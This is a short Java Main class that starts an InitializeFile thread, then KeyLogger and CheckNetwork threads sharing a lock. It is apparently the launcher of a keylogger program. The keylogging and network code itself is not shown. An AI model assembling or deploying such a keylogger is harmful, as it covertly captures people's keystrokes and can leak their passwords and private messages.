
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.util.concurrent.locks.ReentrantLock;
public class Main implements Runnable{
    public void run(){
        ReentrantLock re = new ReentrantLock();
        InitializeFile infObj = new InitializeFile();
        Thread t1 = new Thread(infObj);
        try{
            t1.start();
            t1.join();
        }catch(Exception e){
            System.out.println(e);
        }
        KeyLogger kl = new KeyLogger(re);
        Thread t2 = new Thread(kl);
        t2.start();
        CheckNetwork cn = new CheckNetwork(re);
        Thread t = new Thread(cn);
        t.start();
    }
}